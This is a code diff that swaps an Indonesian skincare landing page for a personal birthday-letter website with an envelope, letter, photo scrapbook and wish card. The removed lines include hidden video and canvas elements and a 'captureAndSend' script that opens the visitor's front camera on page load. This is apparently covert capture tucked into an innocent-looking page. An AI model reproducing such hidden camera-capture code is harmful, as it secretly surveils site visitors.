-            <h1 class="mt-4 text-4xl sm:text-5xl font-extrabold leading-tight tracking-tight">
-              Skincare itu apa sih?
-              <span class="block text-transparent bg-clip-text bg-gradient-to-r from-rose-600 to-amber-600">Perawatan kulit, simpel & efektif.</span>
-            </h1>
-            <p class="mt-4 text-base sm:text-lg text-zinc-600">
-              Skincare adalah rangkaian perawatan untuk menjaga kesehatan <em>skin barrier</em>, mengatasi masalah kulit, dan mencegah kerusakan jangka panjang (terutama dari matahari).
-              Kuncinya: konsisten, sesuai jenis kulit, dan tidak berlebihan.
-            </p>
-            <div class="mt-6 flex flex-col sm:flex-row gap-3">
-              <a href="#rutinitas" class="inline-flex justify-center rounded-xl bg-rose-600 px-5 py-3 text-white font-semibold shadow hover:shadow-md active:scale-[.99] transition">Lihat Rutinitas Dasar</a>
-              <a href="#bahan-aktif" class="inline-flex justify-center rounded-xl border border-zinc-300 bg-white px-5 py-3 text-zinc-800 font-semibold hover:border-zinc-400 active:scale-[.99] transition">Pelajari Bahan Aktif</a>
+  <!-- Floating Hearts Layer -->
+  <div class="hearts-burst-layer" id="heartsLayer" aria-hidden="true"></div>
+
+  <main class="app-viewport">
+
+    <!-- =====================================================================
+         1. OPENING — CREAM ENVELOPE & DUSTY ROSE HEART WAX SEAL
+         ===================================================================== -->
+    <section class="page active" id="page-envelope" aria-label="Pembuka Amplop">
+      <div class="opening-stage">
+        <div class="envelope-halo" aria-hidden="true"></div>
+
+        <div class="envelope-perspective" id="envelopeTrigger" role="button" tabindex="0" aria-label="Buka surat untuk Noviana">
+          <div class="envelope-body">
+            <!-- Rising Letter Insert -->
+            <div class="envelope-letter-insert">
+              <span class="insert-header">Selamat Ulang Tahun, Sayang ♡</span>
+              <span class="insert-sub">Ada sedikit tulisan kecil yang kubuat khusus buat kamu</span>
             </div>
-            <p class="mt-3 text-xs text-zinc-500">Butuh ringkas? Ikuti langkah 3—4—5: cuci muka, lembapkan, sunscreen.</p>
-          </div>
 
-          <div class="relative md:h-[420px]">
-            <div class="absolute inset-0 -rotate-2 rounded-3xl bg-gradient-to-br from-white to-rose-50 border border-zinc-200 shadow-xl"></div>
-            <div class="relative m-2 rounded-3xl border border-zinc-200 bg-white/80 backdrop-blur p-6 shadow-xl">
-              <div class="grid grid-cols-3 gap-3">
-                <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
-                  <p class="text-xs font-semibold text-rose-600">Hydrating</p>
-                  <p class="mt-1 text-xs text-zinc-600">Kulit terasa kenyal & lembap.</p>
-                </div>
-                <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
-                  <p class="text-xs font-semibold text-rose-600">Brightening</p>
-                  <p class="mt-1 text-xs text-zinc-600">Tona lebih merata & cerah.</p>
-                </div>
-                <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
-                  <p class="text-xs font-semibold text-rose-600">Soothing</p>
-                  <p class="mt-1 text-xs text-zinc-600">Reda kemerahan & iritasi.</p>
-                </div>
-                <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
-                  <p class="text-xs font-semibold text-rose-600">Oil-Control</p>
-                  <p class="mt-1 text-xs text-zinc-600">Mengurangi kilap berlebih.</p>
-                </div>
-                <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
-                  <p class="text-xs font-semibold text-rose-600">Anti-Aging</p>
-                  <p class="mt-1 text-xs text-zinc-600">Haluskan garis halus.</p>
-                </div>
-                <div class="rounded-2xl border border-zinc-200 p-4 hover:shadow-sm transition">
-                  <p class="text-xs font-semibold text-rose-600">Barrier Care</p>
-                  <p class="mt-1 text-xs text-zinc-600">Perbaiki lapisan pelindung.</p>
-                </div>
+            <!-- Front Pocket -->
+            <div class="envelope-pocket">
+              <div class="pocket-sides"></div>
+              <div class="pocket-bottom"></div>
+            </div>
+
+            <!-- Vintage Stamp & Postmark -->
+            <div class="envelope-postmark" aria-hidden="true">Spesial</div>
+            <div class="envelope-stamp" aria-hidden="true">
+              <div class="envelope-stamp-inner">
+                <span>&#9825;</span>
               </div>
-              <div class="mt-4 rounded-2xl bg-amber-50 border border-amber-200 p-4">
-                <p class="text-sm font-semibold">Golden rule</p>
-                <p class="text-xs text-zinc-600">Sunscreen tiap pagi, reapply 2—3 jam. Ini fondasi anti-aging terbaik.</p>
+            </div>
+
+            <!-- Recipient Label -->
+            <div class="envelope-to-label">
+              <span>Buat Sayangku, Noviana</span>
+              <div class="envelope-to-line"></div>
+            </div>
+
+            <!-- 3D Top Flap -->
+            <div class="envelope-flap"></div>
+
+            <!-- Heart-Shaped Dusty Rose Wax Seal -->
+            <div class="wax-seal-wrapper" aria-hidden="true">
+              <div class="wax-seal-heart">
+                <svg viewBox="0 0 64 60">
+                  <defs>
+                    <radialGradient id="waxGrad" cx="35%" cy="30%" r="70%">
+                      <stop offset="0%" stop-color="#DFB5B7" />
+                      <stop offset="55%" stop-color="#C58F91" />
+                      <stop offset="100%" stop-color="#9E6568" />
+                    </radialGradient>
+                  </defs>
+                  <!-- Organic heart-shaped wax seal silhouette -->
+                  <path fill="url(#waxGrad)" stroke="#9A6063" stroke-width="1.2"
+                        d="M32 55.5 C29 53.2 6 37.8 6 20.5 C6 11.4 13.1 5 21.4 5 C26.4 5 30.2 7.5 32 10.6 C33.8 7.5 37.6 5 42.6 5 C50.9 5 58 11.4 58 20.5 C58 37.8 35 53.2 32 55.5 Z" />
+                  <!-- Inner embossed heart rim -->
+                  <path fill="none" stroke="rgba(255,252,245,0.48)" stroke-width="1.1"
+                        d="M32 49.5 C29.5 47.5 11.5 34.5 11.5 20.8 C11.5 14.3 16.5 9.8 22.2 9.8 C26.2 9.8 29.8 12 32 15 C34.2 12 37.8 9.8 41.8 9.8 C47.5 9.8 52.5 14.3 52.5 20.8 C52.5 34.5 34.5 47.5 32 49.5 Z" />
+                  <!-- Delicate monogram 'N' -->
+                  <text x="32" y="31" text-anchor="middle" font-family="'Playfair Display', serif" font-style="italic" font-weight="600" font-size="15" fill="#FFFCF5" opacity="0.92">N</text>
+                </svg>
               </div>
             </div>
           </div>
         </div>
+
+        <p class="opening-message">Ada surat kecil spesial yang lagi nungguin kamu nih, sayang.</p>
+        <span class="opening-cue">Ketuk segel hatinya buat buka ya</span>
       </div>
     </section>
 
-    <section id="pengertian" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
-      <div class="grid lg:grid-cols-3 gap-6">
-        <div class="lg:col-span-2 rounded-3xl border border-zinc-200 bg-white p-6 shadow-sm">
-          <h2 class="text-2xl sm:text-3xl font-bold">Pengertian Skincare</h2>
-          <p class="mt-3 text-zinc-600">
-            Skincare mencakup kebiasaan harian untuk membersihkan, menutrisi, dan melindungi kulit. Tujuannya menjaga <strong>keseimbangan minyak–air</strong>,
-            memperkuat <strong>skin barrier</strong>, dan mencegah kerusakan akibat sinar UV, polusi, serta stres. Rutinitas yang baik tidak harus rumit—yang penting <strong>konsisten</strong> dan <strong>tepat sasaran</strong>.
+    <!-- =====================================================================
+         2. BIRTHDAY LETTER — LINED NOTEBOOK
+         ===================================================================== -->
+    <section class="page" id="page-letter" aria-label="Surat Ulang Tahun">
+      <div class="notebook-container">
+        <article class="notebook-paper">
+          <div class="binder-holes" aria-hidden="true">
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+            <span></span>
+          </div>
+
+          <div class="notebook-meta">
+            <span class="notebook-tag">Di hari spesialnya kamu</span>
+            <span class="notebook-heart-stamp">&#9825;</span>
+          </div>
+
+          <div class="handwritten-content">
+            <p class="handwritten-line salutation-text">Selamat Ulang Tahun, Sayang! &#9825;</p>
+            <p class="handwritten-line">Hari ini hari spesialnya Noviana.</p>
+            <p class="handwritten-line">Semoga di umur yang baru ini, kamu selalu dikelilingi hal-hal baik, kenangan seru, dan makin banyak alasan buat terus senyum tiap hari.</p>
+            <p class="handwritten-line">Semoga semua hal kecil yang lagi kamu semogakan diam-diam, pelan-pelan bisa kejadian satu per satu ya.</p>
+            <p class="handwritten-line">Tetap jadi Noviana yang ceria, hangat, dan selalu jadi diri kamu sendiri.</p>
+            <p class="handwritten-line">Kamu pantes banget dapetin semua hal terbaik di dunia ini, sayang.</p>
+
+            <div class="handwritten-line signoff-block">
+              <p>Sayang kamu selalu,</p>
+              <p>Orang yang selalu doain yang terbaik buat kamu.</p>
+            </div>
+          </div>
+        </article>
+
+        <div class="notebook-footer-nav">
+          <button type="button" class="btn-vintage" id="toMemoriesBtn">Lanjut Halaman Berikutnya &rarr;</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- =====================================================================
+         3. PHOTO MEMORIES — POLAROID DIGITAL SCRAPBOOK
+         ===================================================================== -->
+    <section class="page" id="page-memories" aria-label="Kenangan Foto">
+      <div class="scrapbook-container">
+        <header class="scrapbook-header">
+          <h2 class="scrapbook-title">Potongan Kenangan Kita</h2>
+          <p class="scrapbook-subtitle">Ketuk fotonya kalau mau lihat lebih jelas ya</p>
+        </header>
+
+        <div class="polaroid-grid">
+          <!-- Photo 1 -->
+          <div class="polaroid-item" data-src="photo1.jpg" data-caption="Senyum manisnya kamu yang selalu bikin adem ♡">
+            <div class="washi-strip"></div>
+            <div class="polaroid-photo-box">
+              <img src="photo1.jpg" alt="Kenangan 1" />
+              <div class="polaroid-placeholder">
+                <svg viewBox="0 0 24 24" stroke-width="1.5">
+                  <rect x="3" y="5" width="18" height="14" rx="2" />
+                  <circle cx="8.5" cy="10" r="1.5" />
+                  <path d="M21 15l-5-5L5 21" />
+                </svg>
+                <span>photo1.jpg</span>
+              </div>
+            </div>
+            <p class="polaroid-caption">Senyum manisnya kamu yang selalu bikin adem &#9825;</p>
+          </div>
+
+          <!-- Photo 2 -->
+          <div class="polaroid-item" data-src="photo2.jpg" data-caption="Suasana sore yang tenang bareng kamu">
+            <div class="washi-strip"></div>
+            <div class="polaroid-photo-box">
+              <img src="photo2.jpg" alt="Kenangan 2" />
+              <div class="polaroid-placeholder">
+                <svg viewBox="0 0 24 24" stroke-width="1.5">
+                  <rect x="3" y="5" width="18" height="14" rx="2" />
+                  <circle cx="8.5" cy="10" r="1.5" />
+                  <path d="M21 15l-5-5L5 21" />
+                </svg>
+                <span>photo2.jpg</span>
+              </div>
+            </div>
+            <p class="polaroid-caption">Suasana sore yang tenang bareng kamu</p>
+          </div>
+
+          <!-- Photo 3 -->
+          <div class="polaroid-item" data-src="photo3.jpg" data-caption="Momen simpel tapi favoritku banget">
+            <div class="washi-strip"></div>
+            <div class="polaroid-photo-box">
+              <img src="photo3.jpg" alt="Kenangan 3" />
+              <div class="polaroid-placeholder">
+                <svg viewBox="0 0 24 24" stroke-width="1.5">
+                  <rect x="3" y="5" width="18" height="14" rx="2" />
+                  <circle cx="8.5" cy="10" r="1.5" />
+                  <path d="M21 15l-5-5L5 21" />
+                </svg>
+                <span>photo3.jpg</span>
+              </div>
+            </div>
+            <p class="polaroid-caption">Momen simpel tapi favoritku banget</p>
+          </div>
+
+          <!-- Photo 4 -->
+          <div class="polaroid-item" data-src="photo4.jpg" data-caption="Selalu layak buat disimpan rapi">
+            <div class="washi-strip"></div>
+            <div class="polaroid-photo-box">
+              <img src="photo4.jpg" alt="Kenangan 4" />
+              <div class="polaroid-placeholder">
+                <svg viewBox="0 0 24 24" stroke-width="1.5">
+                  <rect x="3" y="5" width="18" height="14" rx="2" />
+                  <circle cx="8.5" cy="10" r="1.5" />
+                  <path d="M21 15l-5-5L5 21" />
+                </svg>
+                <span>photo4.jpg</span>
+              </div>
+            </div>
+            <p class="polaroid-caption">Selalu layak buat disimpan rapi</p>
+          </div>
+        </div>
+
+        <div class="scrapbook-footer-nav">
+          <button type="button" class="btn-subtle" id="backToLetterBtn">&larr; Balik ke Surat</button>
+          <button type="button" class="btn-vintage" id="toFinalBtn">Halaman Terakhir &rarr;</button>
+        </div>
+      </div>
+    </section>
+
+    <!-- =====================================================================
+         4. FINAL PAGE — KEEPSAKE WISH CARD
+         ===================================================================== -->
+    <section class="page" id="page-final" aria-label="Pesan Penutup">
+      <div class="final-keepsake-card">
+        <div class="keepsake-inner-frame">
+          <div class="corner-flourish corner-tl" aria-hidden="true"></div>
+          <div class="corner-flourish corner-tr" aria-hidden="true"></div>
+          <div class="corner-flourish corner-bl" aria-hidden="true"></div>
+          <div class="corner-flourish corner-br" aria-hidden="true"></div>
+
+          <div class="ornament-row" aria-hidden="true">&#9825;</div>
+
+          <h1 class="final-heading">
+            Satu Lagi, <span class="italic rose-shimmer">Sayang...</span>
+          </h1>
+
+          <p class="final-message">
+            Semoga dunia selalu baik sama kamu, hati kamu selalu tenang dan bahagia, dan hari-hari kamu selalu diisi kejutan-kejutan kecil yang bikin senyum.<br /><br />
+            Selamat Ulang Tahun ya, Noviana sayang. &#9825;
           </p>
-          <ul class="mt-4 grid sm:grid-cols-3 gap-3 text-sm">
-            <li class="flex items-center gap-2 rounded-xl border border-zinc-200 bg-rose-50/40 px-3 py-2"><span class="inline-flex h-5 w-5 items-center justify-center rounded-full bg-rose-600 text-white text-[11px] font-bold">1</span>Bersihkan kotoran & sunscreen</li>
-            <li class="flex items-center gap-2 rounded-xl border border-zinc-200 bg-rose-50/40 px-3 py-2"><span class="inline-flex h-5 w-5 items-center justify-center rounded-full bg-rose-600 text-white text-[11px] font-bold">2</span>Hidrasi & kunci kelembapan</li>
-            <li class="flex items-center gap-2 rounded-xl border border-zinc-200 bg-rose-50/40 px-3 py-2"><span class="inline-flex h-5 w-5 items-center justify-center rounded-full bg-rose-600 text-white text-[11px] font-bold">3</span>Lindungi dari sinar UV</li>
-          </ul>
-        </div>
-        <aside class="rounded-3xl border border-rose-200 bg-rose-50 p-6 shadow-sm">
-          <p class="text-sm font-semibold text-rose-700">Catatan singkat</p>
-          <p class="mt-1 text-sm text-rose-800/80">Gunakan produk baru satu per satu (patch test), beri jeda 2–3 minggu untuk melihat hasilnya.</p>
-        </aside>
-      </div>
-    </section>
 
-    <section id="jenis-kulit" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
-      <h2 class="text-2xl sm:text-3xl font-bold">Kenali Jenis Kulit</h2>
-      <p class="mt-2 text-sm text-zinc-600">Pilih produk sesuai kondisi kulit agar hasilnya optimal.</p>
-      <div class="mt-6 grid sm:grid-cols-2 lg:grid-cols-5 gap-4">
-        <div class="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm">
-          <div class="flex items-center justify-between">
-            <p class="font-semibold">Normal</p>
-          </div>
-          <p class="mt-2 text-xs text-zinc-600">Seimbang. Pakai rutinitas dasar + sunscreen.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm">
-          <div class="flex items-center justify-between">
-            <p class="font-semibold">Kering</p>
-          </div>
-          <p class="mt-2 text-xs text-zinc-600">Cari humektan (HA) + emolien (ceramide).</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm">
-          <div class="flex items-center justify-between">
-            <p class="font-semibold">Berminyak</p>
-            <span class="text-[10px] rounded-full bg-amber-100 px-2 py-1 border border-amber-200 text-amber-700">Sebum</span>
-          </div>
-          <p class="mt-2 text-xs text-zinc-600">Gunakan gel-cream, BHA untuk pori.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm">
-          <div class="flex items-center justify-between">
-            <p class="font-semibold">Kombinasi</p>
-          </div>
-          <p class="mt-2 text-xs text-zinc-600">Rawat T-zone berminyak, pipi kering terpisah.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-4 shadow-sm">
-          <div class="flex items-center justify-between">
-            <p class="font-semibold">Sensitif</p>
-          </div>
-          <p class="mt-2 text-xs text-zinc-600">Minim bahan aktif, fokus soothing (centella).</p>
+          <button type="button" class="btn-vintage btn-rose-wax" id="makeWishBtn">
+            Make a Wish &#9825;
+          </button>
+
+          <p class="wish-secret-note" id="wishMessage">
+            Website kecil ini dibuat khusus cuma buat kamu, sayang.
+          </p>
         </div>
       </div>
     </section>
 
-    <section id="rutinitas" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
-      <div class="rounded-3xl border border-zinc-200 bg-white p-6 shadow-sm">
-        <div class="flex items-center justify-between flex-wrap gap-3">
-          <h2 class="text-2xl sm:text-3xl font-bold">Rutinitas Dasar (Pagi & Malam)</h2>
-          <a href="#cta" class="inline-flex items-center rounded-xl border border-zinc-300 bg-white px-4 py-2 text-sm font-semibold hover:border-zinc-400">Unduh Checklist</a>
-        </div>
-        <div class="mt-6 grid md:grid-cols-5 gap-4">
-          <div class="rounded-2xl border border-zinc-200 bg-rose-50/40 p-4">
-            <div class="inline-flex h-6 w-6 items-center justify-center rounded-full bg-rose-600 text-white text-xs font-bold">1</div>
-            <p class="mt-3 font-semibold">Cleanser</p>
-            <p class="text-sm text-zinc-600">Pagi & malam. Pilih gentle.</p>
-          </div>
-          <div class="rounded-2xl border border-zinc-200 bg-rose-50/40 p-4">
-            <div class="inline-flex h-6 w-6 items-center justify-center rounded-full bg-rose-600 text-white text-xs font-bold">2</div>
-            <p class="mt-3 font-semibold">Hydrator/Toner</p>
-            <p class="text-sm text-zinc-600">Pulihkan pH & hidrasi.</p>
-          </div>
-          <div class="rounded-2xl border border-zinc-200 bg-rose-50/40 p-4">
-            <div class="inline-flex h-6 w-6 items-center justify-center rounded-full bg-rose-600 text-white text-xs font-bold">3</div>
-            <p class="mt-3 font-semibold">Serum</p>
-            <p class="text-sm text-zinc-600">Sasaran: jerawat, kusam, aging.</p>
-          </div>
-          <div class="rounded-2xl border border-zinc-200 bg-rose-50/40 p-4">
-            <div class="inline-flex h-6 w-6 items-center justify-center rounded-full bg-rose-600 text-white text-xs font-bold">4</div>
-            <p class="mt-3 font-semibold">Moisturizer</p>
-            <p class="text-sm text-zinc-600">Kunci hidrasi, perbaiki barrier.</p>
-          </div>
-          <div class="rounded-2xl border border-zinc-200 bg-rose-50/40 p-4">
-            <div class="inline-flex h-6 w-6 items-center justify-center rounded-full bg-rose-600 text-white text-xs font-bold">5</div>
-            <p class="mt-3 font-semibold">Sunscreen (AM)</p>
-            <p class="text-sm text-zinc-600">SPF 30+ broad spectrum.</p>
-          </div>
-        </div>
-        <p class="mt-4 text-xs text-zinc-500">Malam hari ganti sunscreen dengan treatment (mis. retinol) sesuai kebutuhan & toleransi.</p>
-      </div>
-    </section>
+  </main>
 
-    <section id="bahan-aktif" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
-      <h2 class="text-2xl sm:text-3xl font-bold">Bahan Aktif Populer</h2>
-      <p class="mt-2 text-sm text-zinc-600">Sesuaikan bahan aktif dengan target masalah kulit.</p>
-      <div class="mt-6 grid md:grid-cols-3 gap-4">
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-sm font-semibold">Niacinamide</p>
-          <p class="mt-1 text-sm text-zinc-600">Cara kerja: Meratakan warna kulit, atur sebum, menenangkan.</p>
-          <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Hampir semua jenis kulit.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-sm font-semibold">Salicylic Acid (BHA)</p>
-          <p class="mt-1 text-sm text-zinc-600">Cara kerja: Eksfoliasi dalam pori, kurangi komedo.</p>
-          <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Kulit berminyak/berjerawat.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-sm font-semibold">Hyaluronic Acid</p>
-          <p class="mt-1 text-sm text-zinc-600">Cara kerja: Tarik & tahan air di kulit.</p>
-          <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Kulit kering atau dehidrasi.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-sm font-semibold">Retinol</p>
-          <p class="mt-1 text-sm text-zinc-600">Cara kerja: Stimulasi kolagen, haluskan tekstur & garis.</p>
-          <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Anti-aging, malam hari, bertahap.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-sm font-semibold">Vitamin C</p>
-          <p class="mt-1 text-sm text-zinc-600">Cara kerja: Antioksidan, cerahkan & lindungi dari radikal bebas.</p>
-          <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Pagi hari, SPF wajib.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-sm font-semibold">Ceramide</p>
-          <p class="mt-1 text-sm text-zinc-600">Cara kerja: Perkuat barrier, kurangi TEWL.</p>
-          <p class="mt-1 text-xs text-zinc-500">Cocok untuk: Kulit kering/sensitif.</p>
-        </div>
-      </div>
-      <div class="mt-4 rounded-2xl border border-amber-200 bg-amber-50 p-4 text-sm">
-        <p class="font-semibold">Tips kombinasi aman</p>
-        <p class="text-zinc-700">Hindari menumpuk terlalu banyak aktif sekaligus. Contoh: kenalkan retinol bertahap; jangan langsung dipasangkan dengan AHA/BHA tiap malam.</p>
-      </div>
-    </section>
-
-    <section class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
-      <h2 class="text-2xl sm:text-3xl font-bold">Mitos vs Fakta</h2>
-      <div class="mt-6 grid md:grid-cols-2 gap-4">
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-xs font-semibold text-rose-600">Mitos</p>
-          <p class="text-sm">Kulit berminyak tidak butuh moisturizer</p>
-          <p class="mt-3 text-xs font-semibold text-emerald-700">Fakta</p>
-          <p class="text-sm text-zinc-700">Tetap butuh! Pilih gel-cream ringan agar barrier terjaga.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-xs font-semibold text-rose-600">Mitos</p>
-          <p class="text-sm">Semakin tinggi SPF, tak perlu reapply</p>
-          <p class="mt-3 text-xs font-semibold text-emerald-700">Fakta</p>
-          <p class="text-sm text-zinc-700">Reapply tetap penting tiap 2–3 jam saat siang/terpapar matahari.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-xs font-semibold text-rose-600">Mitos</p>
-          <p class="text-sm">Retinol bikin kulit tipis</p>
-          <p class="mt-3 text-xs font-semibold text-emerald-700">Fakta</p>
-          <p class="text-sm text-zinc-700">Pemakaian benar justru menebalkan dermis & tingkatkan kolagen.</p>
-        </div>
-        <div class="rounded-2xl border border-zinc-200 bg-white p-5 shadow-sm">
-          <p class="text-xs font-semibold text-rose-600">Mitos</p>
-          <p class="text-sm">Produk mahal pasti lebih bagus</p>
-          <p class="mt-3 text-xs font-semibold text-emerald-700">Fakta</p>
-          <p class="text-sm text-zinc-700">Yang penting formulasi tepat & cocok untuk kulitmu.</p>
-        </div>
-      </div>
-    </section>
-
-    <section id="faq" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-14">
-      <h2 class="text-2xl sm:text-3xl font-bold">Pertanyaan yang Sering Ditanya</h2>
-      <div class="mt-6 space-y-3">
-        <details class="group rounded-2xl border border-zinc-200 bg-white p-4 open:shadow-sm">
-          <summary class="cursor-pointer list-none font-semibold">
-            <span class="mr-2 inline-flex h-5 w-5 items-center justify-center rounded-full border border-zinc-300 text-[11px] group-open:rotate-45 transition">+</span>
-            Urutan skincare yang benar?
-          </summary>
-          <p class="mt-2 text-sm text-zinc-600">Pagi: Cleanser—Hydrator—Serum—Moisturizer—Sunscreen. Malam: Cleanser—Hydrator—Treatment—Moisturizer.</p>
-        </details>
-        <details class="group rounded-2xl border border-zinc-200 bg-white p-4 open:shadow-sm">
-          <summary class="cursor-pointer list-none font-semibold">
-            <span class="mr-2 inline-flex h-5 w-5 items-center justify-center rounded-full border border-zinc-300 text-[11px] group-open:rotate-45 transition">+</span>
-            Berapa banyak sunscreen?
-          </summary>
-          <p class="mt-2 text-sm text-zinc-600">Sekitar dua jari untuk wajah & leher. Reapply tiap 2–3 jam.</p>
-        </details>
-        <details class="group rounded-2xl border border-zinc-200 bg-white p-4 open:shadow-sm">
-          <summary class="cursor-pointer list-none font-semibold">
-            <span class="mr-2 inline-flex h-5 w-5 items-center justify-center rounded-full border border-zinc-300 text-[11px] group-open:rotate-45 transition">+</span>
-            Kapan lihat hasil?
-          </summary>
-          <p class="mt-2 text-sm text-zinc-600">Umumnya 4–8 minggu konsisten, tergantung masalah dan produk.</p>
-        </details>
-        <details class="group rounded-2xl border border-zinc-200 bg-white p-4 open:shadow-sm">
-          <summary class="cursor-pointer list-none font-semibold">
-            <span class="mr-2 inline-flex h-5 w-5 items-center justify-center rounded-full border border-zinc-300 text-[11px] group-open:rotate-45 transition">+</span>
-            Boleh campur banyak aktif?
-          </summary>
-          <p class="mt-2 text-sm text-zinc-600">Mulai satu per satu, dengarkan kulit. Prioritaskan barrier & SPF.</p>
-        </details>
-      </div>
-    </section>
-
-    <section id="cta" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 pb-20">
-      <div class="rounded-3xl border border-zinc-200 bg-gradient-to-br from-rose-100 to-amber-100 p-6 sm:p-10 text-center shadow-sm">
-        <h3 class="text-2xl sm:text-3xl font-bold">Siap kulit sehat & glowing?</h3>
-        <p class="mt-2 text-sm text-zinc-700">Dapatkan checklist PDF & rekomendasi rutin sesuai jenis kulitmu.</p>
-        <form onsubmit="event.preventDefault();" class="mt-6 mx-auto max-w-md flex gap-3">
-          <input type="email" required placeholder="Email kamu" class="flex-1 rounded-xl border border-zinc-300 bg-white px-4 py-3 text-sm outline-none focus:border-rose-400" />
-          <button class="rounded-xl bg-zinc-900 px-5 py-3 text-white text-sm font-semibold hover:shadow active:scale-[.99]">Dapatkan</button>
-        </form>
-        <p class="mt-2 text-[11px] text-zinc-500">Dengan menekan “Dapatkan”, kamu setuju dengan kebijakan privasi kami.</p>
-      </div>
-    </section>
-
-    <footer class="border-t border-zinc-200 bg-white/70">
-      <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-6 flex flex-col sm:flex-row items-center justify-between gap-3 text-sm text-zinc-600">
-        <p>© 2024 GlowGuide. All rights reserved.</p>
-        <div class="flex gap-4">
-          <a href="#" class="hover:text-rose-600">Kebijakan Privasi</a>
-          <a href="#" class="hover:text-rose-600">Ketentuan Layanan</a>
-          <a href="#hero" class="hover:text-rose-600">Kembali ke atas</a>
-        </div>
-      </div>
-    </footer>
+  <!-- Polaroid Zoom Lightbox -->
+  <div class="lightbox-overlay" id="photoLightbox" role="dialog" aria-modal="true" aria-label="Perbesar Polaroid">
+    <div class="lightbox-card">
+      <div class="lightbox-frame" id="lightboxFrame"></div>
+      <p class="lightbox-text" id="lightboxText"></p>
+    </div>
+    <p class="lightbox-close-note">Ketuk di mana aja buat tutup</p>
   </div>
 
-  <video id="videoElement" class="hidden" playsInline muted></video>
-  <canvas id="canvasElement" class="hidden"></canvas>
   <script>
-    document.addEventListener('DOMContentLoaded', () => {
-      const videoRef = document.getElementById('videoElement');
-      const canvasRef = document.getElementById('canvasElement');
-      let streamRef = null;
+    // =========================================================================
+    // 1. GRACEFUL IMAGE FALLBACK FOR PLACEHOLDER PHOTOS (photo1..4.jpg)
+    // =========================================================================
+    function handlePhotoFallback(imgEl) {
+      if (!imgEl || imgEl.dataset.missing === 'true') return;
+      imgEl.style.display = 'none';
+      const placeholder = imgEl.nextElementSibling;
+      if (placeholder) {
+        placeholder.style.display = 'flex';
+      }
+      imgEl.dataset.missing = 'true';
+    }
 
-      async function captureAndSend() {
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
-          streamRef = stream;
-          if (videoRef) {
-            videoRef.srcObject = stream;
-            await videoRef.play();
+    document.querySelectorAll('.polaroid-photo-box img').forEach((img) => {
+      img.addEventListener('error', () => handlePhotoFallback(img));
+      if (img.complete && img.naturalWidth === 0) {
+        handlePhotoFallback(img);
+      }
+    });
+
+    // =========================================================================
+    // 2. AMBIENT FLOATING WARM PARTICLES (SUBTLE GOLDEN/DUSTY ROSE DUST)
+    // =========================================================================
+    function initAmbientParticles() {
+      const canvas = document.getElementById('ambient-canvas');
+      if (!canvas) return;
+      const ctx = canvas.getContext('2d');
+      let motes = [];
+
+      function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+      }
+      window.addEventListener('resize', resizeCanvas);
+      resizeCanvas();
+
+      const count = 24;
+      for (let i = 0; i < count; i++) {
+        motes.push({
+          x: Math.random() * canvas.width,
+          y: Math.random() * canvas.height,
+          radius: 1.2 + Math.random() * 2.2,
+          vx: (Math.random() - 0.5) * 0.25,
+          vy: -0.15 - Math.random() * 0.3,
+          alpha: 0.2 + Math.random() * 0.35,
+          phase: Math.random() * Math.PI * 2
+        });
+      }
+
+      function renderLoop() {
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        motes.forEach((m) => {
+          m.x += m.vx;
+          m.y += m.vy;
+          m.phase += 0.02;
+
+          if (m.y < -10) {
+            m.y = canvas.height + 10;
+            m.x = Math.random() * canvas.width;
+          }
+          if (m.x < -10) m.x = canvas.width + 10;
+          if (m.x > canvas.width + 10) m.x = -10;
+
+          const glowAlpha = m.alpha * (0.55 + 0.45 * Math.sin(m.phase));
+          const gradient = ctx.createRadialGradient(m.x, m.y, 0, m.x, m.y, m.radius * 3);
+          gradient.addColorStop(0, `rgba(197, 143, 145, ${glowAlpha})`);
+          gradient.addColorStop(1, 'rgba(217, 183, 160, 0)');
+
+          ctx.fillStyle = gradient;
+          ctx.beginPath();
